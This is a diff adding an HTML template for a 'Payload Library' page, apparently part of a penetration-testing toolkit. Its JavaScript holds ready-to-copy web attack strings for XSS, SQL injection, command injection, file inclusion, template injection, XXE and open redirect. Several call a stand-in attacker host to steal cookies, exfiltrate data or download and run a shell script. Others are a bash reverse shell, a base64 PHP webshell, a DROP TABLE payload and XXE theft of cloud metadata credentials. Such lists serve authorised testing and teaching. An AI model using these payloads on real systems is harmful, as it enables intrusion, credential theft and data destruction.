@@ -1,0 +1,630 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" /><meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Payload Library — Vantage</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com" />
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=Syne:wght@700;800&family=Fira+Code:wght@400;500&display=swap" rel="stylesheet" />
+  <style>
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+    :root {
+      --bg:#080a12; --s1:#0d0f1c; --s2:#121525; --s3:#191d31;
+      --border:#1e2240; --border-hi:#2d3260;
+      --text:#dde1f5; --text-dim:#6b7099; --text-faint:#373b5c;
+      --accent:#6366f1; --accent-hi:#818cf8; --accent-glow:#6366f133;
+      --radius:12px; --radius-sm:7px; --ease:cubic-bezier(0.16,1,0.3,1);
+    }
+    body { background:var(--bg); color:var(--text); font-family:'Inter',system-ui,sans-serif; font-size:14px; line-height:1.6; }
+
+    /* ── Background ── */
+    .bg-layer { position:fixed; inset:0; z-index:0; pointer-events:none; overflow:hidden; }
+    .blob { position:absolute; border-radius:50%; filter:blur(110px); }
+    .blob-1 { width:720px; height:720px; background:radial-gradient(circle,#3730a318,transparent 70%); top:-180px; left:-60px; animation:d1 24s ease-in-out infinite alternate; }
+    .blob-2 { width:560px; height:560px; background:radial-gradient(circle,#7c3aed0a,transparent 70%); bottom:-120px; right:80px; animation:d2 28s ease-in-out infinite alternate; }
+    .blob-3 { width:400px; height:400px; background:radial-gradient(circle,#0ea5e908,transparent 70%); top:40%; left:40%; animation:d3 20s ease-in-out infinite alternate; }
+    .grid-ov { position:absolute; inset:0; background-image:radial-gradient(circle,#6366f10d 1px,transparent 1px); background-size:28px 28px; opacity:0.5; }
+    @keyframes d1 { to { transform:translate(50px,35px) scale(1.07); } }
+    @keyframes d2 { to { transform:translate(-35px,-50px) scale(1.12); } }
+    @keyframes d3 { to { transform:translate(20px,-30px) scale(0.95); } }
+
+    /* Light mode overrides */
+    :root[data-theme="light"] {
+      --bg:#f5f6fc; --s1:#ecedfa; --s2:#e4e6f5; --s3:#d8daf0;
+      --border:#c4c7e0; --border-hi:#9498c0;
+      --text:#1a1d35; --text-dim:#464b78; --text-faint:#858db8;
+      --accent:#5254cc; --accent-hi:#4347b8; --accent-glow:#6366f120;
+    }
+    [data-theme="light"] .blob-1 { background:radial-gradient(circle,#6366f108 0%,transparent 70%) !important; }
+    [data-theme="light"] .blob-2 { background:radial-gradient(circle,#7c3aed06 0%,transparent 70%) !important; }
+    [data-theme="light"] .blob-3 { background:radial-gradient(circle,#0ea5e906 0%,transparent 70%) !important; }
+    [data-theme="light"] .grid-ov { background-image:radial-gradient(circle,#6366f10a 1px,transparent 1px) !important; }
+    [data-theme="light"] .payload-code { background:#dde0f2; border-color:#c4c7e0; color:#1a1d35; }
+    [data-theme="light"] .tag-chip { background:#d8daf0; border-color:#c4c7e0; color:#464b78; }
+    [data-theme="light"] .tab { background:#e4e6f5; border-color:#c4c7e0; color:#464b78; }
+    [data-theme="light"] .tab.active { background:#5254cc; border-color:#5254cc; color:#fff; }
+    [data-theme="light"] .search-input { background:#ecedfa; border-color:#c4c7e0; color:#1a1d35; }
+    [data-theme="light"] .chip { background:#e4e6f5; border-color:#c4c7e0; color:#464b78; }
+    [data-theme="light"] .chip.active { background:#5254cc22; border-color:#5254cc; color:#5254cc; }
+    [data-theme="light"] .payload-card { background:#ecedfa; border-color:#c4c7e0; }
+    [data-theme="light"] .payload-card:hover { border-color:#9498c0; }
+    [data-theme="light"] .copy-btn, [data-theme="light"] .encode-btn { background:#e4e6f5; border-color:#c4c7e0; color:#464b78; }
+    [data-theme="light"] .copy-btn:hover, [data-theme="light"] .encode-btn:hover { border-color:#5254cc; color:#5254cc; }
+    [data-theme="light"] .page-header { background:#f5f6fc; border-color:#c4c7e0; }
+    [data-theme="light"] .stats-bar { background:#ecedfa; border-color:#c4c7e0; }
+
+    /* ── Layout ── */
+    .main { position:relative; z-index:1; margin-left:60px; min-height:100vh; display:flex; flex-direction:column; }
+
+    .page-header {
+      position:sticky; top:0; z-index:100;
+      background:var(--bg); border-bottom:1px solid var(--border);
+      padding:14px 28px 12px;
+      display:flex; align-items:center; gap:16px;
+      backdrop-filter:blur(8px);
+    }
+    .back-link {
+      color:var(--text-faint); text-decoration:none; font-size:0.75rem;
+      transition:color 0.15s; white-space:nowrap; flex-shrink:0;
+    }
+    .back-link:hover { color:var(--text-dim); }
+    .header-divider { width:1px; height:20px; background:var(--border); flex-shrink:0; }
+    .page-title {
+      font-family:'Syne',sans-serif; font-weight:800; font-size:1.15rem;
+      letter-spacing:0.05em; flex:1;
+    }
+    .header-badge {
+      font-size:0.62rem; font-weight:700; letter-spacing:0.1em; text-transform:uppercase;
+      padding:3px 10px; border-radius:99px;
+      background:var(--accent-glow); border:1px solid var(--accent)50; color:var(--accent-hi);
+      flex-shrink:0;
+    }
+
+    /* ── Content area ── */
+    .content { flex:1; padding:24px 28px 60px; max-width:1200px; width:100%; }
+
+    /* ── Controls row ── */
+    .controls { display:flex; flex-direction:column; gap:12px; margin-bottom:20px; }
+
+    /* Tab bar */
+    .tab-bar { display:flex; gap:6px; flex-wrap:wrap; }
+    .tab {
+      padding:6px 16px; font-family:'Inter',sans-serif; font-size:0.78rem; font-weight:600;
+      background:var(--s2); border:1px solid var(--border); border-radius:999px;
+      color:var(--text-dim); cursor:pointer; transition:all 0.15s;
+      white-space:nowrap; letter-spacing:0.02em;
+    }
+    .tab:hover { border-color:var(--border-hi); color:var(--text); }
+    .tab.active {
+      background:var(--accent); border-color:var(--accent); color:#fff;
+      box-shadow:0 2px 12px var(--accent-glow);
+    }
+
+    /* Search */
+    .search-row { display:flex; gap:10px; align-items:center; }
+    .search-wrap { position:relative; flex:1; max-width:420px; }
+    .search-icon { position:absolute; left:11px; top:50%; transform:translateY(-50%); color:var(--text-faint); font-size:0.85rem; pointer-events:none; }
+    .search-input {
+      width:100%; background:var(--s1); border:1px solid var(--border); border-radius:var(--radius-sm);
+      padding:8px 11px 8px 32px; color:var(--text); font-family:'Inter',sans-serif; font-size:0.82rem;
+      outline:none; transition:border-color 0.15s, box-shadow 0.15s;
+    }
+    .search-input:focus { border-color:var(--accent); box-shadow:0 0 0 3px var(--accent-glow); }
+    .search-input::placeholder { color:var(--text-faint); }
+    .results-count { font-size:0.72rem; color:var(--text-faint); white-space:nowrap; }
+
+    /* Context chips */
+    .context-chips { display:flex; gap:6px; flex-wrap:wrap; }
+    .chip {
+      padding:4px 11px; font-size:0.68rem; font-weight:600; letter-spacing:0.06em;
+      background:var(--s2); border:1px solid var(--border); border-radius:999px;
+      color:var(--text-dim); cursor:pointer; transition:all 0.15s; white-space:nowrap;
+      text-transform:uppercase;
+    }
+    .chip:hover { border-color:var(--border-hi); color:var(--text); }
+    .chip.active {
+      background:var(--accent-glow); border-color:var(--accent)80; color:var(--accent-hi);
+    }
+    .chip-clear { color:var(--text-faint); }
+    .chip-clear:hover { color:var(--text); border-color:var(--border-hi); }
+
+    /* Stats bar */
+    .stats-bar {
+      display:flex; align-items:center; gap:16px;
+      background:var(--s1); border:1px solid var(--border); border-radius:var(--radius-sm);
+      padding:8px 14px; margin-bottom:16px;
+      font-size:0.72rem; color:var(--text-faint);
+    }
+    .stat { display:flex; align-items:center; gap:5px; }
+    .stat-num { font-weight:700; color:var(--text-dim); font-family:'Fira Code',monospace; }
+
+    /* ── Payload list ── */
+    .payload-list { display:flex; flex-direction:column; gap:10px; }
+
+    .payload-card {
+      background:var(--s1); border:1px solid var(--border); border-radius:var(--radius);
+      padding:14px 16px;
+      transition:border-color 0.15s, box-shadow 0.15s;
+    }
+    .payload-card:hover { border-color:var(--border-hi); box-shadow:0 2px 16px rgba(0,0,0,0.25); }
+
+    .card-top { display:flex; align-items:flex-start; gap:12px; }
+    .payload-code-wrap { flex:1; min-width:0; }
+    .payload-code {
+      display:block; width:100%;
+      background:var(--s2); border:1px solid var(--border); border-radius:var(--radius-sm);
+      padding:10px 14px;
+      font-family:'Fira Code','Menlo','Consolas',monospace; font-size:0.78rem; font-weight:400;
+      color:var(--accent-hi); line-height:1.6;
+      white-space:pre-wrap; word-break:break-all;
+      margin-bottom:8px;
+    }
+    .card-meta { display:flex; align-items:center; gap:8px; flex-wrap:wrap; }
+    .payload-desc { font-size:0.76rem; color:var(--text-dim); flex:1; }
+
+    .tag-chip {
+      display:inline-flex; align-items:center;
+      padding:2px 8px; font-size:0.62rem; font-weight:700; letter-spacing:0.07em;
+      background:var(--s3); border:1px solid var(--border); border-radius:99px;
+      color:var(--text-faint); text-transform:uppercase; white-space:nowrap;
+      transition:border-color 0.12s, color 0.12s;
+    }
+
+    /* Tag color variants */
+    .tag-waf    { background:#f8717115; border-color:#f8717140; color:#f87171; }
+    .tag-basic  { background:#22d3a515; border-color:#22d3a540; color:#22d3a5; }
+    .tag-blind  { background:#f59e0b15; border-color:#f59e0b40; color:#f59e0b; }
+    .tag-dom    { background:#818cf815; border-color:#818cf840; color:#818cf8; }
+    .tag-encoded { background:#a78bfa15; border-color:#a78bfa40; color:#a78bfa; }
+    .tag-filter { background:#fb923c15; border-color:#fb923c40; color:#fb923c; }
+    .tag-error  { background:#f4720815; border-color:#f4720840; color:#f47208; }
+    .tag-time   { background:#0ea5e915; border-color:#0ea5e940; color:#0ea5e9; }
+    .tag-union  { background:#10b98115; border-color:#10b98140; color:#10b981; }
+    .tag-oob    { background:#ec489915; border-color:#ec489940; color:#ec4899; }
+
+    /* Action buttons */
+    .card-actions { display:flex; flex-direction:column; gap:6px; flex-shrink:0; }
+    .copy-btn, .encode-btn {
+      padding:6px 12px; font-family:'Inter',sans-serif; font-size:0.72rem; font-weight:600;
+      background:var(--s2); border:1px solid var(--border); border-radius:var(--radius-sm);
+      color:var(--text-dim); cursor:pointer; transition:all 0.15s;
+      white-space:nowrap; min-width:82px; text-align:center;
+    }
+    .copy-btn:hover  { border-color:var(--accent); color:var(--accent-hi); background:var(--accent-glow); }
+    .encode-btn:hover { border-color:#a78bfa80; color:#a78bfa; background:#a78bfa12; }
+    .copy-btn.flashed  { border-color:#22d3a5; color:#22d3a5; background:#22d3a515; }
+    .encode-btn.flashed { border-color:#a78bfa; color:#a78bfa; background:#a78bfa15; }
+
+    /* Empty state */
+    .empty-state {
+      text-align:center; padding:60px 20px;
+      color:var(--text-faint); font-size:0.85rem;
+    }
+    .empty-icon { font-size:2.4rem; margin-bottom:12px; opacity:0.4; }
+    .empty-msg { font-size:0.9rem; color:var(--text-dim); margin-bottom:6px; }
+
+    ::-webkit-scrollbar { width:5px; }
+    ::-webkit-scrollbar-track { background:transparent; }
+    ::-webkit-scrollbar-thumb { background:var(--border); border-radius:3px; }
+
+    @media (max-width:700px) {
+      .content { padding:16px 14px 60px; }
+      .page-header { padding:12px 16px; }
+      .main { margin-left:60px; }
+      .card-top { flex-direction:column; }
+      .card-actions { flex-direction:row; }
+    }
+  </style>
+</head>
+<body>
+{% include '_nav.html' %}
+
+<div class="bg-layer" aria-hidden="true">
+  <div class="blob blob-1"></div>
+  <div class="blob blob-2"></div>
+  <div class="blob blob-3"></div>
+  <div class="grid-ov"></div>
+</div>
+
+<div class="main">
+
+  <header class="page-header">
+    <a href="/generators" class="back-link">← Generators</a>
+    <div class="header-divider"></div>
+    <div class="page-title">Payload Library</div>
+    <span class="header-badge">Client-side</span>
+  </header>
+
+  <div class="content">
+
+    <div class="controls">
+
+      <!-- Category tabs -->
+      <div class="tab-bar" id="tab-bar">
+        <button class="tab active" data-cat="XSS">XSS</button>
+        <button class="tab" data-cat="SQLi">SQLi</button>
+        <button class="tab" data-cat="RCE">RCE</button>
+        <button class="tab" data-cat="LFI">LFI / Path Traversal</button>
+        <button class="tab" data-cat="SSTI">SSTI</button>
+        <button class="tab" data-cat="XXE">XXE</button>
+        <button class="tab" data-cat="Redirect">Open Redirect</button>
+      </div>
+
+      <!-- Search + count -->
+      <div class="search-row">
+        <div class="search-wrap">
+          <span class="search-icon">⌕</span>
+          <input class="search-input" id="search-input" type="text"
+                 placeholder="Filter payloads by text or description…"
+                 autocomplete="off" spellcheck="false" />
+        </div>
+        <span class="results-count" id="results-count"></span>
+      </div>
+
+      <!-- Context filter chips -->
+      <div class="context-chips" id="context-chips">
+        <button class="chip chip-clear active" data-ctx="all">All</button>
+        <button class="chip" data-ctx="WAF Bypass">WAF Bypass</button>
+        <button class="chip" data-ctx="Basic">Basic</button>
+        <button class="chip" data-ctx="Blind">Blind</button>
+        <button class="chip" data-ctx="DOM">DOM</button>
+        <button class="chip" data-ctx="Encoded">Encoded</button>
+        <button class="chip" data-ctx="Filter Evasion">Filter Evasion</button>
+        <button class="chip" data-ctx="Error-Based">Error-Based</button>
+        <button class="chip" data-ctx="Time-Based">Time-Based</button>
+        <button class="chip" data-ctx="Union">Union</button>
+        <button class="chip" data-ctx="OOB">OOB</button>
+      </div>
+
+    </div>
+
+    <!-- Stats bar -->
+    <div class="stats-bar" id="stats-bar">
+      <span class="stat">Category: <span class="stat-num" id="stat-cat">XSS</span></span>
+      <span class="stat">Showing <span class="stat-num" id="stat-shown">0</span> / <span class="stat-num" id="stat-total">0</span> payloads</span>
+    </div>
+
+    <!-- Payload list -->
+    <div class="payload-list" id="payload-list"></div>
+
+  </div><!-- /content -->
+</div><!-- /main -->
+
+<script>
+'use strict';
+
+/* ════════════════════════════════════════════════════════════════
+   PAYLOAD DATA
+   ════════════════════════════════════════════════════════════════ */
+const PAYLOADS = {
+
+  XSS: [
+    { payload: '<script>alert(1)<\/script>',                      desc: 'Basic inline script XSS',                                        tags: ['Basic'] },
+    { payload: '<img src=x onerror=alert(1)>',                    desc: 'Image onerror handler — works without script tags',              tags: ['Basic'] },
+    { payload: '<svg onload=alert(1)>',                           desc: 'SVG onload event — inline SVG execution',                        tags: ['Basic'] },
+    { payload: '"><script>alert(1)<\/script>',                    desc: 'Break out of double-quoted HTML attribute then inject script',   tags: ['Basic'] },
+    { payload: `'"><img src=x onerror=alert(document.domain)>`,   desc: 'Attribute break exposing domain — useful for scope confirmation', tags: ['Basic'] },
+    { payload: 'javascript:alert(1)',                             desc: 'javascript: URI — use in href, src, or action attributes',       tags: ['Basic'] },
+    { payload: '<iframe src="javascript:alert(1)">',              desc: 'iframe javascript: — executes in child frame context',           tags: ['Basic'] },
+    { payload: '<body onload=alert(1)>',                          desc: 'body onload event injection',                                   tags: ['Basic'] },
+    { payload: '<input autofocus onfocus=alert(1)>',              desc: 'autofocus onfocus — fires on page load without interaction',     tags: ['Basic'] },
+    { payload: '<details open ontoggle=alert(1)>',                desc: 'HTML5 details ontoggle — triggers on open state change',        tags: ['Basic'] },
+    { payload: `<script>fetch('https://attacker.com/?c='+document.cookie)<\/script>`, desc: 'Cookie exfiltration via fetch()', tags: ['Blind', 'OOB'] },
+    { payload: `<img src=x onerror="this.src='https://attacker.com/?c='+document.cookie">`, desc: 'Cookie steal via img onerror without script tag', tags: ['Blind', 'OOB'] },
+    { payload: '%3Cscript%3Ealert(1)%3C%2Fscript%3E',             desc: 'URL-encoded script tag — bypasses basic string filters',        tags: ['Encoded', 'Filter Evasion'] },
+    { payload: '<ScRiPt>alert(1)<\/ScRiPt>',                      desc: 'Mixed case tag — bypasses case-sensitive filters',              tags: ['WAF Bypass'] },
+    { payload: '<scr<script>ipt>alert(1)<\/scr<\/script>ipt>',    desc: 'Nested broken tag trick — reconstructed after filter strips inner', tags: ['WAF Bypass'] },
+    { payload: '<script>\\u0061lert(1)<\/script>',                desc: 'Unicode escape in JS identifier — evades literal-match filters', tags: ['Encoded', 'WAF Bypass'] },
+    { payload: '<a href="javas&#x09;cript:alert(1)">click</a>',   desc: 'Tab character between javascript and colon — URI filter bypass', tags: ['Filter Evasion', 'WAF Bypass'] },
+    { payload: '<div onmouseover="alert(1)">hover me</div>',      desc: 'Mouse interaction event handler — useful when load events are blocked', tags: ['Basic', 'DOM'] },
+  ],
+
+  SQLi: [
+    { payload: `' OR '1'='1`,                              desc: 'Classic auth bypass — always-true condition',                 tags: ['Basic'] },
+    { payload: `' OR '1'='1' --`,                          desc: 'Auth bypass with comment to ignore trailing query',           tags: ['Basic'] },
+    { payload: `' OR 1=1 --`,                              desc: 'Numeric always-true bypass with line comment',                tags: ['Basic'] },
+    { payload: `admin'--`,                                 desc: 'Admin login bypass — comment strips password check',          tags: ['Basic'] },
+    { payload: `' UNION SELECT NULL--`,                    desc: 'UNION probe — determines if UNION is allowed',               tags: ['Union'] },
+    { payload: `' UNION SELECT NULL,NULL--`,               desc: 'UNION 2-column probe — increment NULLs to find column count', tags: ['Union'] },
+    { payload: `' UNION SELECT username,password FROM users--`, desc: 'Credential dump via UNION — requires matching column count', tags: ['Union'] },
+    { payload: `' ORDER BY 1--`,                           desc: 'Column count enumeration — increment until error',           tags: ['Basic'] },
+    { payload: `' AND 1=1--`,                              desc: 'Boolean true condition — page should render normally',       tags: ['Basic', 'Blind'] },
+    { payload: `' AND 1=2--`,                              desc: 'Boolean false condition — compare response to 1=1',          tags: ['Basic', 'Blind'] },
+    { payload: `'; WAITFOR DELAY '0:0:5'--`,               desc: 'MSSQL time-based blind — 5 second delay confirms injection',  tags: ['Time-Based', 'Blind'] },
+    { payload: `' AND SLEEP(5)--`,                         desc: 'MySQL time-based blind — SLEEP() delay confirms injection',   tags: ['Time-Based', 'Blind'] },
+    { payload: `1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--`, desc: 'MySQL time-based — nested subquery form, evades simple filters', tags: ['Time-Based', 'Blind', 'Filter Evasion'] },
+    { payload: `' AND EXTRACTVALUE(1, CONCAT(0x7e,(SELECT version())))--`, desc: 'MySQL error-based via EXTRACTVALUE — leaks data in error message', tags: ['Error-Based'] },
+    { payload: `'; DROP TABLE users--`,                    desc: 'Drop table (Bobby Tables) — destructive; use only with permission', tags: ['Basic'] },
+    { payload: `' OR EXISTS(SELECT 1 FROM users WHERE username='admin')--`, desc: 'Blind boolean — confirms existence of admin user without data return', tags: ['Blind'] },
+    { payload: `' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='a'--`, desc: 'Blind character-by-character extraction', tags: ['Blind'] },
+    { payload: `'; EXEC xp_cmdshell('whoami')--`,          desc: 'MSSQL command execution via xp_cmdshell (requires enabled)',   tags: ['OOB'] },
+  ],
+
+  RCE: [
+    { payload: '; id',                                             desc: 'Basic semicolon command injection — check for RCE',             tags: ['Basic'] },
+    { payload: '| id',                                            desc: 'Pipe operator injection — run id alongside original command',    tags: ['Basic'] },
+    { payload: '&& id',                                           desc: 'AND operator — executes id only if first command succeeds',      tags: ['Basic'] },
+    { payload: '$(id)',                                           desc: 'Command substitution — embeds output of id inline',              tags: ['Basic'] },
+    { payload: '`id`',                                            desc: 'Backtick substitution — legacy command substitution form',       tags: ['Basic'] },
+    { payload: '; curl http://attacker.com/$(id)',                 desc: 'OOB exfiltration via curl — confirm RCE with DNS/HTTP callback',  tags: ['OOB', 'Blind'] },
+    { payload: "; /bin/bash -c 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1'", desc: 'Bash reverse shell — replace IP and port', tags: ['Basic'] },
+    { payload: `; python3 -c 'import os;os.system("id")'`,        desc: 'Python subprocess injection — alternative when bash is restricted', tags: ['Basic', 'Filter Evasion'] },
+    { payload: '%0aid',                                           desc: 'URL-encoded newline injection — separates commands in URL context', tags: ['Encoded', 'Filter Evasion'] },
+    { payload: 'a;id',                                            desc: 'No-whitespace semicolon injection — bypasses space filters',    tags: ['Filter Evasion', 'WAF Bypass'] },
+    { payload: '1;$(nslookup attacker.com)',                       desc: 'DNS OOB confirmation — nslookup callback confirms blind RCE',   tags: ['OOB', 'Blind'] },
+    { payload: '; wget http://attacker.com/shell.sh -O /tmp/s && bash /tmp/s', desc: 'Download and execute payload via wget',            tags: ['OOB'] },
+  ],
+
+  LFI: [
+    { payload: '../../../etc/passwd',                              desc: 'Basic LFI — 3-level path traversal to /etc/passwd',            tags: ['Basic'] },
+    { payload: '../../../../etc/passwd',                           desc: 'Deeper traversal — adjust depth to match application root',    tags: ['Basic'] },
+    { payload: '../../../etc/passwd%00',                           desc: 'Null byte bypass — terminates string in older PHP/C apps',     tags: ['Filter Evasion', 'Encoded'] },
+    { payload: '....//....//....//etc/passwd',                     desc: 'Double-slash traversal — some sanitizers only strip ../ once', tags: ['Filter Evasion', 'WAF Bypass'] },
+    { payload: '..%2F..%2F..%2Fetc%2Fpasswd',                     desc: 'URL-encoded slash — bypasses literal ../ filters',            tags: ['Encoded', 'Filter Evasion'] },
+    { payload: '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',         desc: 'Double URL-encoded dots and slashes — deep encoding bypass',  tags: ['Encoded', 'Filter Evasion'] },
+    { payload: '../../../proc/self/environ',                       desc: 'Process environment — may contain HTTP headers for log poisoning', tags: ['Basic'] },
+    { payload: '../../../var/log/apache2/access.log',              desc: 'Apache log poisoning — inject PHP into User-Agent then include log', tags: ['Blind'] },
+    { payload: 'php://filter/convert.base64-encode/resource=/etc/passwd', desc: 'PHP stream wrapper — base64-encode file contents to read binary', tags: ['Encoded'] },
+    { payload: 'php://input',                                      desc: 'PHP input wrapper — read POST body as file (use with RCE payload in body)', tags: ['Basic'] },
+    { payload: 'data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=', desc: 'PHP data wrapper with base64 webshell — <?php system($_GET[\'cmd\']); ?>', tags: ['Encoded'] },
+    { payload: 'expect://id',                                      desc: 'PHP expect wrapper — executes OS commands (requires expect extension)', tags: ['Basic'] },
+  ],
+
+  SSTI: [
+    { payload: '{{7*7}}',                                          desc: 'Jinja2 / Twig math probe — response of 49 confirms SSTI',      tags: ['Basic'] },
+    { payload: '${7*7}',                                           desc: 'FreeMarker / Velocity probe — common in Java-based apps',       tags: ['Basic'] },
+    { payload: '<%= 7*7 %>',                                       desc: 'ERB (Ruby) or EJS (Node.js) probe',                            tags: ['Basic'] },
+    { payload: '{{config}}',                                       desc: 'Jinja2 config object dump — exposes Flask SECRET_KEY and more', tags: ['Basic'] },
+    { payload: `{{''.__class__.__mro__[1].__subclasses__()}}`,    desc: 'Jinja2 class traversal — enumerate Python subclasses for gadget chain', tags: ['Basic'] },
+    { payload: `{{''.__class__.__mro__[1].__subclasses__()[439].__init__.__globals__['__builtins__']['__import__']('os').popen('id').read()}}`, desc: 'Jinja2 RCE via subclass chain — index may vary; enumerate first', tags: ['Basic'] },
+    { payload: `{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}`, desc: 'Jinja2 RCE via request.application — Flask-specific alternative chain', tags: ['Basic'] },
+    { payload: '#{7*7}',                                           desc: 'Ruby ERB / Slim probe — also used in some Java template engines', tags: ['Basic'] },
+    { payload: '${T(java.lang.Runtime).getRuntime().exec("id")}',  desc: 'Spring Expression Language (SpEL) RCE — common in Spring Boot apps', tags: ['Basic'] },
+    { payload: '*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(\'id\').getInputStream())}', desc: 'Thymeleaf SpEL injection — executes and returns command output', tags: ['Basic'] },
+  ],
+
+  XXE: [
+    {
+      payload: `<?xml version="1.0"?>
+<!DOCTYPE root [
+  <!ENTITY xxe SYSTEM "file:///etc/passwd">
+]>
+<root>&xxe;</root>`,
+      desc: 'Classic XXE — reads /etc/passwd via external entity',                                tags: ['Basic']
+    },
+    {
+      payload: `<?xml version="1.0"?>
+<!DOCTYPE root [
+  <!ENTITY % data SYSTEM "file:///etc/passwd">
+  <!ENTITY % param1 "<!ENTITY exfil SYSTEM 'http://attacker.com/?d=%data;'>">
+  %param1;
+]>
+<root>&exfil;</root>`,
+      desc: 'XXE with parameter entity — two-stage OOB exfiltration via HTTP',                    tags: ['OOB', 'Blind']
+    },
+    {
+      payload: `<?xml version="1.0"?>
+<!DOCTYPE root [
+  <!ENTITY % payload SYSTEM "http://attacker.com/evil.dtd">
+  %payload;
+]>
+<root/>`,
+      desc: 'Blind OOB XXE — fetches external DTD for out-of-band data exfiltration via DNS/HTTP', tags: ['Blind', 'OOB']
+    },
+    {
+      payload: `<?xml version="1.0"?>
+<!DOCTYPE root [
+  <!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini">
+]>
+<root>&xxe;</root>`,
+      desc: 'XXE file:// — Windows variant reading win.ini',                                      tags: ['Basic']
+    },
+    {
+      payload: `<?xml version="1.0"?>
+<!DOCTYPE lolz [
+  <!ENTITY lol "lol">
+  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
+  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
+  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
+  <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
+  <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
+]>
+<root>&lol6;</root>`,
+      desc: 'Billion Laughs DoS — exponential entity expansion; use only in controlled environments', tags: ['Basic']
+    },
+    {
+      payload: `<?xml version="1.0"?>
+<!DOCTYPE root [
+  <!ENTITY xxe SYSTEM "https://169.254.169.254/latest/meta-data/iam/security-credentials/">
+]>
+<root>&xxe;</root>`,
+      desc: 'XXE SSRF to AWS metadata — retrieves IAM credentials via instance metadata service',   tags: ['OOB', 'Blind']
+    },
+  ],
+
+  Redirect: [
+    { payload: '//attacker.com',                                   desc: 'Protocol-relative URL — browser prepends current scheme (http or https)', tags: ['Basic'] },
+    { payload: 'https://attacker.com',                             desc: 'Absolute URL redirect — direct to external host',                tags: ['Basic'] },
+    { payload: '//attacker.com/%2f..',                             desc: 'Path confusion after redirect domain — may bypass path-prefix checks', tags: ['Filter Evasion'] },
+    { payload: '///attacker.com',                                  desc: 'Triple-slash — some parsers treat as //attacker.com',            tags: ['WAF Bypass', 'Filter Evasion'] },
+    { payload: 'https://google.com@attacker.com',                  desc: 'Credential notation abuse — authority is attacker.com, not google.com', tags: ['Filter Evasion', 'WAF Bypass'] },
+    { payload: 'javascript:alert(1)',                              desc: 'JS redirect — executes JS when followed; shows XSS impact',     tags: ['Basic'] },
+    { payload: 'https://attacker%2ecom',                           desc: 'Dot URL-encoding — bypasses simple domain allowlist string match', tags: ['Encoded', 'Filter Evasion'] },
+    { payload: '/%09/attacker.com',                                desc: 'Tab character in path — some WAFs miss this before domain',     tags: ['WAF Bypass', 'Encoded'] },
+  ],
+
+};
+
+/* ════════════════════════════════════════════════════════════════
+   STATE
+   ════════════════════════════════════════════════════════════════ */
+let activeCategory = 'XSS';
+let activeCtx      = 'all';
+let searchQuery    = '';
+
+/* ════════════════════════════════════════════════════════════════
+   TAG CHIP CLASS MAPPING
+   ════════════════════════════════════════════════════════════════ */
+const TAG_CLASS = {
+  'WAF Bypass':    'tag-waf',
+  'Basic':         'tag-basic',
+  'Blind':         'tag-blind',
+  'DOM':           'tag-dom',
+  'Encoded':       'tag-encoded',
+  'Filter Evasion':'tag-filter',
+  'Error-Based':   'tag-error',
+  'Time-Based':    'tag-time',
+  'Union':         'tag-union',
+  'OOB':           'tag-oob',
+};
+
+/* ════════════════════════════════════════════════════════════════
+   RENDER
+   ════════════════════════════════════════════════════════════════ */
+function esc(s) {
+  return String(s || '').replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;');
+}
+
+function renderList() {
+  const list     = document.getElementById('payload-list');
+  const countEl  = document.getElementById('results-count');
+  const shownEl  = document.getElementById('stat-shown');
+  const totalEl  = document.getElementById('stat-total');
+  const catEl    = document.getElementById('stat-cat');
+
+  const payloads = PAYLOADS[activeCategory] || [];
+  const q = searchQuery.toLowerCase();
+
+  const filtered = payloads.filter(p => {
+    const matchCtx = activeCtx === 'all' || p.tags.includes(activeCtx);
+    const matchQ   = !q || p.payload.toLowerCase().includes(q) || p.desc.toLowerCase().includes(q) ||
+                     p.tags.some(t => t.toLowerCase().includes(q));
+    return matchCtx && matchQ;
+  });
+
+  catEl.textContent   = activeCategory;
+  totalEl.textContent = payloads.length;
+  shownEl.textContent = filtered.length;
+  countEl.textContent = filtered.length === payloads.length
+    ? `${payloads.length} payload${payloads.length !== 1 ? 's' : ''}`
+    : `${filtered.length} of ${payloads.length}`;
+
+  if (!filtered.length) {
+    list.innerHTML = `<div class="empty-state">
+      <div class="empty-icon">⌀</div>
+      <div class="empty-msg">No payloads match your filters</div>
+      <div>Try clearing the search or selecting a different context tag</div>
+    </div>`;
+    return;
+  }
+
+  list.innerHTML = filtered.map((p, i) => {
+    const idx = payloads.indexOf(p);
+    const tagHtml = p.tags.map(t =>
+      `<span class="tag-chip ${TAG_CLASS[t] || ''}">${esc(t)}</span>`
+    ).join('');
+    return `
+    <div class="payload-card" data-idx="${idx}">
+      <div class="card-top">
+        <div class="payload-code-wrap">
+          <pre class="payload-code" id="pc-${idx}">${esc(p.payload)}</pre>
+          <div class="card-meta">
+            <span class="payload-desc">${esc(p.desc)}</span>
+            ${tagHtml}
+          </div>
+        </div>
+        <div class="card-actions">
+          <button class="copy-btn" onclick="copyPayload(${idx}, this)" title="Copy payload to clipboard">Copy</button>
+          <button class="encode-btn" onclick="encodePayload(${idx}, this)" title="Copy URL-encoded version">URL Encode</button>
+        </div>
+      </div>
+    </div>`;
+  }).join('');
+}
+
